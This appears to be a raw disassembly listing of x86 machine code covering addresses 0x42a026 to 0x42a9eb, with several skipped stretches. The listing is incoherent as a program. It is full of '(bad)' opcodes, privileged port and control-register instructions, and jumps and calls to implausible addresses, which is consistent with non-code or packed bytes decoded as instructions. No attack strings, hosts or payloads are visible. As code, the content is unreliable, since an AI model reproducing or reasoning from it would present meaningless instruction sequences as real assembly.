  42a026:	retf   0x3c09
  42a029:	xchg   ebx,eax
  42a02a:	fs in  al,dx
  42a02c:	fadd   QWORD PTR [ebp+0x452fc47c]
  42a032:	aad    0x86
  42a034:	mov    esi,0x7f41d2d2
  42a039:	pop    ss
  42a03a:	xor    dh,BYTE PTR ds:0x81994b49
  42a040:	hlt    
  42a041:	sbb    ebx,DWORD PTR [ebx+0x3b5438b9]
  42a047:	dec    esi
  42a048:	repz cld 
  42a04a:	aas    
  42a04b:	aad    0x3e
  42a04d:	pop    ss
  42a04e:	sbb    DWORD PTR [eax-0x2e],ebx
  42a051:	shr    cl,cl
  42a053:	in     eax,0x78
  42a055:	xchg   ecx,eax
  42a056:	push   ss
  42a057:	push   ss
  42a058:	cmc    
  42a059:	jmp    0x429feb
  42a05b:	enter  0x569e,0xd3
  42a05f:	inc    edx
  42a060:	jmp    0x42a068
  42a062:	mov    ds:0x4eed99c9,eax
  42a067:	adc    BYTE PTR [esp+edx*4-0x4de030fe],dh
  42a06e:	cli    
  42a06f:	lock push ds
  42a071:	sbb    dl,0xf2
  42a074:	xor    eax,0xfcbc226c
  42a079:	(bad)  [edx]
  42a07b:	sub    BYTE PTR [edi-0x10],dh
  42a07e:	add    BYTE PTR [ebx+0xc53c585],ch
  42a084:	pop    es
  42a085:	push   esp
  42a086:	mov    cl,0xb8
  42a088:	sbb    BYTE PTR [edi],0xcc
  42a08b:	adc    al,0x1a
  42a08d:	in     eax,0x2d
  42a08f:	cs cmp DWORD PTR gs:[eax+ebp*1],esi
  42a094:	sar    DWORD PTR gs:[edi-0x70],0x3e
  42a099:	fld    TBYTE PTR [edi]
  42a09b:	inc    esp
  42a09c:	sbb    WORD PTR [ebp+0x7c4b5f7d],bp
  42a0a3:	mov    ebp,0xa036bc66
  42a0a8:	mov    eax,ds:0xbcdf3f58
  42a0ad:	xchg   ebx,eax
  42a0ae:	fsubp  st(0),st
  42a0b0:	jecxz  0x42a0f4
  42a0b2:	inc    ecx
  42a0b3:	call   0xbc4537ac
  42a0b8:	stc    
  42a0b9:	call   0x74b8c7ab
  42a0be:	inc    edx
  42a0bf:	(bad)  
  42a0c0:	repnz mov eax,ds:0xe3fa4d6d
  42a0c6:	cs pop ebp
  42a0c8:	mov    ebx,0x3acdb3a9
  42a0cd:	fmul   st(4),st
  42a0cf:	call   0x8d0:0x3376448a
  42a0d6:	xor    DWORD PTR [ebp-0x72],esi
  42a0d9:	sbb    cl,ah
  42a0db:	(bad)  
  42a0dc:	push   esi
  42a0dd:	movhps QWORD PTR [eax-0x1560dde9],xmm4
  42a0e4:	jb     0x42a07e
  42a0e6:	mov    ds:0x500a75ff,eax
  42a0eb:	jnp    0x42a086
  42a0ed:	push   edi
	...
  42a156:	xlat   BYTE PTR ds:[ebx]
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	or     eax,0x67501d79
  42a167:	ret    
  42a168:	add    DWORD PTR [eax],eax
  42a16a:	add    BYTE PTR [ecx],al
  42a16c:	add    BYTE PTR [eax],al
  42a16e:	test   eax,0xd8fda443
  42a173:	adc    al,0xbc
  42a175:	cmp    dh,BYTE PTR [esi]
  42a177:	jmp    0x42a14d
  42a179:	sub    eax,DWORD PTR [edx]
  42a17b:	sahf   
  42a17c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a17d:	(bad)  
  42a17e:	pop    edx
  42a17f:	arpl   cx,bp
  42a181:	jle    0x42a17f
  42a183:	or     esp,DWORD PTR [eax]
  42a185:	inc    ecx
  42a186:	aad    0x5b
  42a188:	dec    eax
  42a189:	dec    ebp
  42a18a:	push   esi
  42a18b:	loop   0x42a162
  42a18d:	nop
  42a18e:	js     0x42a17c
  42a190:	test   BYTE PTR [ebx-0x690409a9],ah
  42a196:	ror    BYTE PTR [ecx-0x6e3bb7e5],0xfb
  42a19d:	aas    
  42a19e:	and    DWORD PTR [ebx-0x7a],0xffffffbd
  42a1a2:	mov    ds:0x930c168c,eax
  42a1a7:	ja     0x42a14a
  42a1a9:	cmp    cl,0x19
  42a1ac:	xor    BYTE PTR ds:0xdd471e5c,al
  42a1b2:	adc    al,0x8d
  42a1b4:	pop    ds
  42a1b5:	fld    st(2)
  42a1b7:	stos   BYTE PTR es:[edi],al
  42a1b8:	add    edx,DWORD PTR [edx]
  42a1ba:	mov    ds:0xfc02f4c5,al
  42a1bf:	push   0xdcfe81b3
  42a1c4:	and    cl,0xe8
  42a1c7:	push   edx
  42a1c8:	and    BYTE PTR [bp+si-0x1f34],0x14
  42a1ce:	push   ds
  42a1cf:	int3   
  42a1d0:	leave  
  42a1d1:	pop    esp
  42a1d2:	les    ebp,FWORD PTR [ebp+0x5e]
  42a1d5:	repnz mov BYTE PTR [edx],0xa6
  42a1d9:	cmc    
  42a1da:	jmp    0xcc9ba56e
  42a1df:	push   ecx
  42a1e0:	and    DWORD PTR [ebx+0x2cff1ba2],0x53
  42a1e7:	ds dec esi
  42a1e9:	xor    eax,0x829a7593
  42a1ee:	scas   eax,DWORD PTR es:[edi]
  42a1ef:	shl    DWORD PTR [edx],0x4d
  42a1f2:	push   0x6e34ae26
  42a1f7:	ins    DWORD PTR es:[edi],dx
  42a1f8:	xlat   BYTE PTR ds:[ebx]
  42a1f9:	push   ebx
  42a1fa:	test   al,0x16
  42a1fd:	outs   dx,DWORD PTR ds:[esi]
  42a1fe:	and    DWORD PTR [ebp-0x76],esi
  42a201:	stos   DWORD PTR es:[edi],eax
  42a202:	mov    ds:0x82ebcb1a,al
  42a207:	adc    BYTE PTR [ebx+0x2b37f6ea],dl
  42a20d:	call   0xb63a:0x8ec82ea4
  42a214:	out    dx,al
  42a215:	ins    DWORD PTR es:[edi],dx
  42a216:	pushf  
  42a217:	cmp    cl,cl
  42a219:	pop    ecx
  42a21a:	inc    ecx
  42a21b:	push   0xffffffe7
  42a21d:	cmp    edx,edx
  42a21f:	test   bl,ah
  42a221:	xor    edi,DWORD PTR [edx]
  42a223:	leave  
  42a224:	adc    dl,BYTE PTR gs:[edx]
  42a227:	or     al,0x24
  42a229:	mov    BYTE PTR [edx+0x5b8e9ef8],ah
  42a22f:	pusha  
  42a230:	adc    BYTE PTR [esi],bh
  42a232:	outs   dx,BYTE PTR ds:[esi]
  42a233:	mov    al,ds:0xa95d99c7
  42a238:	or     eax,0x89f1ef34
  42a23d:	shr    BYTE PTR [edx-0x2190bf8a],1
  42a243:	arpl   si,sp
  42a245:	mov    edi,0xbf5faa10
  42a24a:	ins    DWORD PTR es:[edi],dx
  42a24b:	je     0x42a277
  42a24d:	jg     0x42a29c
  42a24f:	inc    edi
  42a250:	or     eax,edx
  42a252:	repnz sbb eax,0x5f205f35
  42a258:	imul   ecx,DWORD PTR [edi+0x3f],0x59
  42a25c:	sbb    eax,0x6300dcf5
  42a261:	imul   esp,DWORD PTR [ecx+0x2bded7d1],0xcf0db323
  42a26b:	iret   
  42a26c:	ins    DWORD PTR es:[edi],dx
  42a26d:	jmp    0x42a26f
	...
  42a2d3:	add    BYTE PTR [eax],al
  42a2d5:	add    BYTE PTR [ebx],ch
  42a2d7:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	fldcw  WORD PTR [eax]
  42a2e3:	mov    bl,BYTE PTR [eax+esi*2]
  42a2e6:	les    eax,FWORD PTR [bx+di]
  42a2e9:	add    BYTE PTR [eax],al
  42a2eb:	add    DWORD PTR [eax],eax
  42a2ed:	add    BYTE PTR [edi+0x14],dl
  42a2f0:	in     eax,0xd5
  42a2f2:	aad    0xb3
  42a2f4:	adc    DWORD PTR [ebx+0x78],ecx
  42a2f7:	and    BYTE PTR [esi+0x0],ch
  42a2fa:	leave  
  42a2fb:	fmulp  st(2),st
  42a2fd:	mov    edi,0x96f2daef
  42a302:	aad    0x15
  42a304:	out    0xd3,eax
  42a306:	in     al,0xd8
  42a308:	iret   
  42a309:	mov    cs,ecx
  42a30b:	push   edi
  42a30c:	aam    0x9a
  42a30e:	sbb    eax,0x727fbc97
  42a313:	inc    esp
  42a314:	(bad)  
  42a315:	xchg   ebx,eax
  42a316:	sar    DWORD PTR ds:0xc7c0bb75,cl
  42a31c:	xchg   edi,eax
  42a31d:	hlt    
  42a31e:	push   eax
  42a31f:	sub    BYTE PTR [edi+ebx*2-0x25],bh
  42a323:	mov    ah,0xd9
  42a325:	ror    BYTE PTR [ebp+0xa],1
  42a328:	repnz mov al,ds:0xacef758c
  42a32e:	xchg   edx,eax
  42a32f:	mov    edi,0x2497dc8e
  42a334:	aas    
  42a335:	dec    edi
  42a336:	push   ebx
  42a337:	xor    ebx,esi
  42a339:	mov    edi,esp
  42a33b:	push   edi
  42a33c:	inc    esp
  42a33d:	in     eax,0xdb
  42a33f:	dec    ecx
  42a340:	jl     0x42a329
  42a342:	pop    ecx
  42a343:	mov    dh,0x69
  42a345:	and    cl,BYTE PTR [ebx+eiz*1-0x62]
  42a349:	jne    0x42a2f3
  42a34b:	neg    BYTE PTR [ebp+0x45]
  42a34e:	js     0x42a2f5
  42a350:	add    BYTE PTR [edi+ecx*2+0x68a5908],0x61
  42a358:	fwait
  42a359:	xor    al,0x16
  42a35b:	rol    BYTE PTR [edx],1
  42a35d:	mov    al,0x75
  42a35f:	fdiv   QWORD PTR [ebp-0x6]
  42a362:	mov    ch,0x7
  42a364:	jns    0x42a2f8
  42a366:	xor    eax,0x9598eef1
  42a36b:	ds out dx,eax
  42a36d:	les    edi,FWORD PTR [ecx]
  42a36f:	ror    DWORD PTR [eax-0x52],cl
  42a372:	into   
  42a373:	rep lods al,BYTE PTR ds:[esi]
  42a375:	push   ebx
  42a376:	push   edx
  42a377:	jmp    0x858e82fc
  42a37c:	ret    0x8d1f
  42a37f:	sub    DWORD PTR [ebx],eax
  42a381:	cmp    BYTE PTR [esi],0xea
  42a384:	sbb    bh,0xb9
  42a387:	jmp    0xd3809305
  42a38c:	jae    0x42a329
  42a38e:	jns    0x42a37a
  42a390:	mov    ds:0xe40f4ef9,al
  42a395:	add    eax,0x33ce27fe
  42a39a:	into   
  42a39b:	adc    DWORD PTR [eax-0x13acba1c],0x71207a28
  42a3a5:	data16 and al,0xf0
  42a3a8:	pop    ss
  42a3a9:	hlt    
  42a3aa:	mov    ebp,0x38c5249
  42a3af:	adc    al,ch
  42a3b1:	mov    esi,0xc90162b9
  42a3b6:	test   BYTE PTR [ebx+0x68],al
  42a3b9:	in     eax,dx
  42a3ba:	dec    BYTE PTR [eax-0x61]
  42a3bd:	or     ebp,ebp
  42a3bf:	mov    BYTE PTR [edx-0xc8ed4ba],bh
  42a3c5:	xchg   esp,eax
  42a3c6:	test   DWORD PTR [ebx+0x33],eax
  42a3c9:	cmp    DWORD PTR [ebx-0x2e],0x24
  42a3cd:	je     0x42a39b
  42a3cf:	or     esp,DWORD PTR [ecx]
  42a3d1:	mov    eax,ds:0x7497e19a
  42a3d6:	stos   DWORD PTR es:[edi],eax
  42a3d7:	out    dx,eax
  42a3d8:	inc    ebp
  42a3d9:	sbb    ch,BYTE PTR [eax+0x6277fb64]
  42a3df:	cmp    eax,0xa4cb9214
  42a3e4:	ins    DWORD PTR es:[edi],dx
  42a3e5:	repnz icebp 
  42a3e7:	add    al,0x46
  42a3e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a3ea:	sbb    eax,0x7ff8ec
	...
  42a453:	add    BYTE PTR [eax],al
  42a455:	add    BYTE PTR [edi+0xe],bh
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0xd354333d
  42a465:	shl    BYTE PTR [edi-0x3b],0x1
  42a469:	add    BYTE PTR [eax],al
  42a46b:	add    DWORD PTR [eax],eax
  42a46d:	add    dh,ch
  42a46f:	mov    ds:0x19c1f0ea,al
  42a474:	push   edx
  42a475:	cwde   
  42a476:	push   es
  42a477:	push   ecx
  42a478:	sti    
  42a479:	dec    esi
  42a47a:	imul   eax,DWORD PTR [ebx-0x7b8aae17],0x21
  42a481:	fstp   QWORD PTR [edi+0x70321ff3]
  42a487:	pop    es
  42a488:	mov    WORD PTR [esi],ds
  42a48a:	imul   ebp,DWORD PTR [ecx-0x3015bc5f],0xffffff90
  42a491:	scas   al,BYTE PTR es:[edi]
  42a492:	sbb    esi,edi
  42a494:	(bad)  
  42a495:	xchg   esi,eax
  42a496:	fmul   QWORD PTR [esi]
  42a498:	idiv   bh
  42a49a:	xchg   DWORD PTR [ecx-0x5a73b4fc],esi
  42a4a0:	jb     0x42a429
  42a4a2:	push   ebx
  42a4a3:	outs   dx,BYTE PTR ds:[esi]
  42a4a4:	xchg   edi,eax
  42a4a5:	fistp  WORD PTR [esi-0x6eb7a98d]
  42a4ab:	or     cl,BYTE PTR [esi-0x4c]
  42a4ae:	cmp    DWORD PTR [bx+0x5edb],esi
  42a4b3:	adc    DWORD PTR [ebp-0x77],0x6247f51c
  42a4ba:	jb     0x42a44e
  42a4bc:	cmp    BYTE PTR [ecx],dl
  42a4be:	icebp  
  42a4bf:	xor    BYTE PTR [edx+0x4f],bl
  42a4c2:	fmul   QWORD PTR [ebx-0x4b54845a]
  42a4c8:	mov    dh,0xbf
  42a4ca:	int    0xf2
  42a4cc:	xchg   ebx,eax
  42a4cd:	shr    DWORD PTR [edx],0x8f
  42a4d0:	mov    bl,0x3b
  42a4d2:	sti    
  42a4d3:	stos   BYTE PTR es:[edi],al
  42a4d4:	loope  0x42a545
  42a4d6:	pop    esi
  42a4d7:	lea    esi,[edi]
  42a4d9:	ja     0x42a503
  42a4db:	add    DWORD PTR [ebp-0x6],ebp
  42a4de:	out    dx,al
  42a4df:	dec    eax
  42a4e0:	mov    cl,ah
  42a4e2:	popa   
  42a4e3:	and    DWORD PTR [eax+eiz*2],edi
  42a4e6:	or     ebp,DWORD PTR [esi]
  42a4e8:	or     DWORD PTR [edx-0x65e89fc8],ebp
  42a4ee:	(bad)  
  42a4ef:	loop   0x42a53f
  42a4f1:	sar    BYTE PTR [eax+0x1588490d],1
  42a4f7:	shl    bl,1
  42a4f9:	int3   
  42a4fa:	outs   dx,BYTE PTR ds:[esi]
  42a4fb:	add    DWORD PTR [ebx],ebx
  42a4fd:	popf   
  42a4fe:	jecxz  0x42a4aa
  42a500:	xor    BYTE PTR [esi],ah
  42a502:	mov    eax,cr6
  42a505:	or     al,0x16
  42a507:	in     al,0x4f
  42a509:	dec    esi
  42a50a:	cmp    ebp,esi
  42a50c:	repz gs enter 0xab29,0x46
  42a512:	ret    0x614d
  42a515:	imul   ecx,DWORD PTR [ebx-0x1c],0xffffffcb
  42a519:	xchg   edi,eax
  42a51a:	push   edi
  42a51b:	bound  ecx,QWORD PTR [ebx+0x5]
  42a51e:	aas    
  42a51f:	jmp    0x42a512
  42a521:	push   cs
  42a522:	and    BYTE PTR [ebx-0x2f],dh
  42a525:	fiadd  WORD PTR [eax]
  42a527:	inc    eax
  42a528:	into   
  42a529:	xor    al,0x7f
  42a52b:	pop    eax
  42a52c:	cmp    esi,ebx
  42a52e:	adc    DWORD PTR [esi+edi*2+0x2b],ebx
  42a532:	les    edi,FWORD PTR [edx]
  42a534:	push   ebp
  42a535:	mov    WORD PTR [ebx+esi*4],es
  42a538:	sbb    bl,BYTE PTR [edi+0x1527f153]
  42a53e:	fwait
  42a53f:	stc    
  42a540:	or     eax,DWORD PTR [edi+eiz*1]
  42a543:	push   edx
  42a544:	or     esi,ebp
  42a546:	cld    
  42a547:	rcl    DWORD PTR [ecx],cl
  42a549:	outs   dx,BYTE PTR ds:[esi]
  42a54a:	push   esi
  42a54b:	int    0x52
  42a54d:	mov    ebp,0xaa666d14
  42a552:	(bad)
  42a555:	loopne 0x42a4df
  42a557:	and    BYTE PTR [edx+0x30ceb897],0x3e
  42a55e:	fcmovu st,st(3)
  42a560:	pop    esp
  42a561:	add    cl,BYTE PTR [esi-0x25dae150]
  42a567:	xor    bh,al
  42a569:	(bad)  
  42a56a:	adc    eax,0x29b1b1
	...
  42a5d3:	add    BYTE PTR [eax],al
  42a5d5:	add    BYTE PTR [eax],bl
  42a5d7:	dec    edi
  42a5d8:	pop    ss
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0xfdf7179f
  42a5e5:	lahf   
  42a5e6:	mov    BYTE PTR [bx+di],0x0
  42a5ea:	add    BYTE PTR [ecx],al
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	mov    al,0xcd
  42a5f0:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42a5f2:	jns    0x42a5e8
  42a5f4:	mov    esi,0x99a154c7
  42a5f9:	sub    eax,0x666f6b82
  42a5fe:	rol    DWORD PTR [eax+0x6cc5986d],cl
  42a604:	sahf   
  42a605:	ins    DWORD PTR es:[edi],dx
  42a606:	xchg   edi,eax
  42a607:	mov    esi,0x5111eb4b
  42a60c:	add    dl,dl
  42a60e:	ins    DWORD PTR es:[edi],dx
  42a60f:	cmc    
  42a610:	dec    esp
  42a611:	mov    bh,0x93
  42a613:	xchg   ecx,eax
  42a614:	or     BYTE PTR [esi+0x3fe8704f],al
  42a61a:	fisubr DWORD PTR [esi+ebp*1+0x7b]
  42a61e:	scas   eax,DWORD PTR es:[edi]
  42a61f:	sar    DWORD PTR [esi+0x75],cl
  42a622:	loopne 0x42a6a3
  42a624:	js     0x42a65a
  42a626:	pop    es
  42a627:	cmc    
  42a628:	lds    ebx,FWORD PTR [edx-0x75332230]
  42a62e:	addr16 xchg edx,eax
  42a630:	jecxz  0x42a6a7
  42a632:	jno    0x42a69e
  42a634:	aam    0xd2
  42a636:	cmp    DWORD PTR [eax],ecx
  42a638:	jle    0x42a680
  42a63a:	out    dx,eax
  42a63b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a63c:	mov    ebp,DWORD PTR [edi+0x5c]
  42a63f:	adc    esi,DWORD PTR [edi+0x4f]
  42a642:	or     al,0x23
  42a644:	mov    ebx,DWORD PTR ss:[edx]
  42a647:	inc    eax
  42a648:	rcr    DWORD PTR [edx-0x5c2021fc],cl
  42a64e:	fst    DWORD PTR ds:0x84d569ef
  42a654:	lock xor eax,eax
  42a657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a658:	mov    eax,DWORD PTR [ecx+ebp*2+0x10]
  42a65c:	in     eax,dx
  42a65d:	mov    ah,ch
  42a65f:	clc    
  42a660:	adc    esp,DWORD PTR [edi]
  42a662:	out    dx,al
  42a663:	loope  0x42a648
  42a665:	into   
  42a666:	call   0x90bd40e1
  42a66b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a66c:	hlt    
  42a66d:	dec    esp
  42a66e:	mov    al,0x58
  42a670:	xchg   BYTE PTR [ecx+0x707235ee],bl
  42a676:	test   BYTE PTR [ebp+0x68a02e5f],al
  42a67c:	or     ah,bh
  42a67e:	imul   edx,ebp,0xc536f73d
  42a684:	xor    ah,bl
  42a686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a687:	cmp    eax,esi
  42a689:	stos   BYTE PTR es:[edi],al
  42a68a:	push   es
  42a68b:	test   BYTE PTR [esi-0x5b81380b],al
  42a691:	les    ebx,FWORD PTR [esi+0x59]
  42a694:	jnp    0x42a6a4
  42a696:	fs pop es
  42a698:	cmc    
  42a699:	add    DWORD PTR [ebx+0x13],esp
  42a69c:	imul   esp,DWORD PTR [ecx-0x1],0x4be56bf4
  42a6a3:	adc    BYTE PTR [edx+0x7a],dh
  42a6a6:	and    BYTE PTR [ebp+0x3e],0x31
  42a6aa:	bnd jmp 0x7b7a5a96
  42a6b0:	(bad)  
  42a6b1:	and    DWORD PTR [ecx-0x1a],edi
  42a6b4:	mov    eax,DWORD PTR [esi+ebx*8-0x38]
  42a6b8:	(bad)  
  42a6b9:	aam    0x3f
  42a6bb:	cs popa 
  42a6bd:	push   eax
  42a6be:	mov    DWORD PTR [esi+esi*1],ebp
  42a6c1:	imul   ecx,ebp,0x56
  42a6c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a6c5:	clc    
  42a6c6:	and    eax,0xcbe9a890
  42a6cb:	mov    dh,0x12
  42a6cd:	push   ebp
  42a6ce:	or     al,0x21
  42a6d0:	mov    ah,0x88
  42a6d2:	jl     0x42a672
  42a6d4:	pop    ecx
  42a6d5:	ror    edx,0x9c
  42a6d8:	jb     0x42a6bb
  42a6da:	push   esi
  42a6db:	mov    cl,0xa4
  42a6dd:	push   ebx
  42a6de:	dec    ecx
  42a6df:	loopne 0x42a750
  42a6e1:	je     0x42a760
  42a6e3:	mov    eax,ds:0x5073d122
  42a6e8:	jg     0x42a69f
  42a6ea:	loop   0x42a6ad
  42a6ec:	or     al,0x22
	...
  42a756:	and    al,0x16
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi-0x7b47ece4],0x6748c193
  42a767:	mov    DWORD PTR [ecx],0x10000
  42a76d:	add    BYTE PTR [edi+0x72],bl
  42a770:	pop    esi
  42a771:	test   eax,0x4d73606e
  42a776:	outs   dx,DWORD PTR es:[esi]
  42a778:	outs   dx,DWORD PTR ds:[esi]
  42a779:	leave  
  42a77a:	test   al,0xcb
  42a77c:	inc    esp
  42a77d:	rcl    DWORD PTR [eax],cl
  42a77f:	pop    edx
  42a780:	push   esp
  42a781:	or     cl,al
  42a783:	push   ds
  42a784:	pop    ecx
  42a785:	mov    ds:0x99f0ad5e,al
  42a78a:	cmp    ch,BYTE PTR [edx+0x4c6d041f]
  42a790:	addr16 jge 0x42a7c5
  42a793:	sub    eax,0x6099d208
  42a798:	sahf   
  42a799:	inc    eax
  42a79a:	test   al,0xe
  42a79c:	cwde   
  42a79d:	xchg   esi,eax
  42a79e:	mov    al,ds:0x5be0eb02
  42a7a3:	mov    ds:0xb2a8312a,al
  42a7a8:	or     DWORD PTR [ecx+0x72aad722],esp
  42a7ae:	or     dl,al
  42a7b0:	outs   dx,BYTE PTR ds:[esi]
  42a7b1:	push   esp
  42a7b2:	sub    DWORD PTR [eax+0x15],ebx
  42a7b5:	(bad)  
  42a7b6:	outs   dx,DWORD PTR ds:[esi]
  42a7b7:	adc    BYTE PTR [edx+ebx*1+0x51],ch
  42a7bb:	in     al,dx
  42a7bc:	adc    DWORD PTR [edi+0x4f],esp
  42a7bf:	mov    edi,DWORD PTR [edx]
  42a7c1:	test   al,0x37
  42a7c3:	fninit 
  42a7c5:	lods   al,BYTE PTR ds:[esi]
  42a7c6:	mov    bh,0xfe
  42a7c8:	mov    esi,0x301e86dc
  42a7cd:	jl     0x42a7fa
  42a7cf:	sbb    ah,bh
  42a7d1:	mov    cl,0x61
  42a7d3:	xchg   edx,eax
  42a7d4:	repz xchg ebx,eax
  42a7d6:	add    edx,ebx
  42a7d8:	int    0x87
  42a7da:	sar    BYTE PTR [ebx+0x532ccf14],1
  42a7e0:	enter  0x3453,0x8a
  42a7e4:	aas    
  42a7e5:	cmp    DWORD PTR [ebx+0x49],0xf09fd112
  42a7ec:	add    DWORD PTR [ecx+0x2a],ebp
  42a7ef:	ret    
  42a7f0:	dec    esi
  42a7f1:	mov    bh,0x45
  42a7f3:	leave  
  42a7f4:	enter  0x880d,0xc
  42a7f8:	aaa    
  42a7f9:	(bad)  
  42a7fb:	inc    eax
  42a7fc:	sbb    esi,0x546a11e0
  42a802:	add    eax,0x3294143a
  42a807:	adc    BYTE PTR [eax+0xbba8b93],dl
  42a80d:	inc    eax
  42a80e:	mov    edi,0x20e00fa
  42a813:	daa    
  42a814:	and    al,0x6e
  42a816:	mov    ch,0x42
  42a818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a819:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a81b:	cmp    eax,0xa0654939
  42a820:	jg     0x42a7d8
  42a822:	les    esp,FWORD PTR [edi+0xb3910c2]
  42a828:	retf   0xb6fd
  42a82b:	imul   edi,DWORD PTR [ebp+0x67061343],0xffffffb0
  42a832:	fmul   st(7),st
  42a834:	icebp  
  42a835:	xchg   cl,bl
  42a837:	mov    DWORD PTR [eax-0x5],eax
  42a83a:	(bad)  
  42a83b:	mov    dh,0x32
  42a83d:	ret    
  42a83e:	out    0xc0,al
  42a840:	pop    esi
  42a841:	and    al,0x34
  42a843:	push   ecx
  42a844:	aaa    
  42a845:	scas   eax,DWORD PTR es:[edi]
  42a846:	imul   ebx,DWORD PTR [ecx+0x3e],0xab2d89db
  42a84d:	xchg   esi,eax
  42a84e:	and    al,0x2a
  42a850:	sahf   
  42a851:	xor    al,0x29
  42a853:	dec    esi
  42a854:	and    eax,DWORD PTR [ecx-0xc]
  42a857:	(bad)  
  42a858:	out    dx,al
  42a859:	lds    esi,FWORD PTR [esp+eax*8+0x2a]
  42a85d:	clc    
  42a85e:	out    dx,eax
  42a85f:	aam    0xe5
  42a861:	retf   0x43c3
  42a864:	add    edi,DWORD PTR [edx+0x8]
  42a867:	and    BYTE PTR [esi-0x20],ch
  42a86a:	outs   dx,DWORD PTR ds:[esi]
  42a86b:	gs jnp 0x42a86b
	...
  42a8d6:	mov    ah,BYTE PTR [ebp+0x63]
  42a8d9:	mov    edi,0x75debfef
  42a8de:	add    ebp,0x501c6c97
  42a8e4:	adc    al,BYTE PTR ds:0x1c867
  42a8ea:	add    BYTE PTR [ecx],al
  42a8ec:	add    BYTE PTR [eax],al
  42a8ee:	adc    BYTE PTR [edi],al
  42a8f0:	mov    esp,0xc9755f32
  42a8f5:	sbb    dh,BYTE PTR [ebp+0x68]
  42a8f8:	sbb    edi,DWORD PTR ds:0xc92d0d36
  42a8fe:	test   eax,0xd450177d
  42a903:	pop    ebx
  42a904:	dec    ebx
  42a905:	dec    esp
  42a906:	(bad)  
  42a907:	lahf   
  42a908:	repnz dec esp
  42a90a:	cmp    al,bl
  42a90c:	mov    WORD PTR [eax-0x53b0091b],ss
  42a912:	mov    bh,0xb
  42a914:	pop    ecx
  42a915:	push   ds
  42a916:	out    dx,eax
  42a917:	or     al,0x56
  42a919:	ret    
  42a91a:	(bad)  
  42a91b:	repz mul al
  42a91e:	jno    0x42a8fe
  42a920:	(bad)  
  42a922:	mov    cl,0x68
  42a924:	mov    WORD PTR [ecx+ebp*2+0x5c],es
  42a928:	fnstcw WORD PTR ds:0xd949bc4a
  42a92e:	data16 and BYTE PTR [ecx-0x2d1cb990],cl
  42a935:	push   edx
  42a936:	inc    ebx
  42a937:	or     al,0xe
  42a939:	xchg   edi,eax
  42a93a:	inc    eax
  42a93b:	retf   
  42a93c:	lods   eax,DWORD PTR ds:[esi]
  42a93d:	or     al,0xfc
  42a93f:	and    cl,BYTE PTR [ebp+0x12adf391]
  42a945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a946:	(bad)  
  42a947:	std    
  42a948:	aaa    
  42a949:	shl    ch,1
  42a94b:	out    0xc,al
  42a94d:	and    DWORD PTR [edx+ebp*2+0x27],edi
  42a951:	cld    
  42a952:	xchg   ebx,eax
  42a953:	arpl   WORD PTR [eax+0x6875ee32],cx
  42a959:	mov    eax,ds:0x9067c820
  42a95e:	sbb    ebp,edi
  42a960:	mov    esi,0x426f73be
  42a965:	mov    edx,0xa6ee324c
  42a96a:	jb     0x42a987
  42a96c:	les    ebp,FWORD PTR ds:0x96f5d28e
  42a972:	lods   eax,DWORD PTR ds:[esi]
  42a973:	mov    ds:0xafc539b5,eax
  42a978:	dec    esp
  42a979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a97a:	ret    0xfbdc
  42a97d:	xor    edi,ebx
  42a97f:	and    al,0xb
  42a981:	popa   
  42a982:	jge    0x42a9ee
  42a984:	aaa    
  42a985:	popa   
  42a986:	lock xor ebx,ebp
  42a989:	cdq    
  42a98a:	mov    ebp,0x268f6ff0
  42a98f:	mov    ebx,0xef871c43
  42a994:	pop    edi
  42a995:	dec    edi
  42a996:	cld    
  42a997:	mov    dh,0xaf
  42a999:	sub    al,dl
  42a99b:	mov    edx,0x983d237d
  42a9a0:	xchg   DWORD PTR [ebx+0x51],ebx
  42a9a3:	jno    0x42a9fd
  42a9a5:	pop    edi
  42a9a6:	test   al,0x93
  42a9a8:	and    al,0xab
  42a9aa:	shl    BYTE PTR [ecx],cl
  42a9ac:	out    0x1c,al
  42a9ae:	je     0x42a9bc
  42a9b0:	dec    ebp
  42a9b1:	lea    eax,[ebx]
  42a9b3:	xor    WORD PTR [ecx+eiz*8+0x2d],bp
  42a9b8:	mov    cl,0x7a
  42a9ba:	jp     0x42a9af
  42a9bc:	mov    al,0x2f
  42a9be:	popf   
  42a9bf:	xor    cl,BYTE PTR [ebx+edx*1]
  42a9c2:	scas   al,BYTE PTR es:[edi]
  42a9c3:	adc    ch,BYTE PTR ds:0x5c634767
  42a9c9:	push   0xffffffd0
  42a9cb:	ja     0x42a9b3
  42a9cd:	jmp    0x1a27b44f
  42a9d2:	add    al,0x45
  42a9d4:	mov    ebp,0x1e18254
  42a9d9:	push   esi
  42a9da:	xchg   esi,eax
  42a9db:	repnz outs dx,BYTE PTR ds:[esi]
  42a9dd:	jo     0x42aa53
  42a9df:	nop
  42a9e0:	sub    al,0x33
  42a9e2:	sbb    ah,BYTE PTR [edi+0x21]
  42a9e5:	addr16 adc eax,0x5ef315c7
  42a9eb:	jb     0x42a9fc
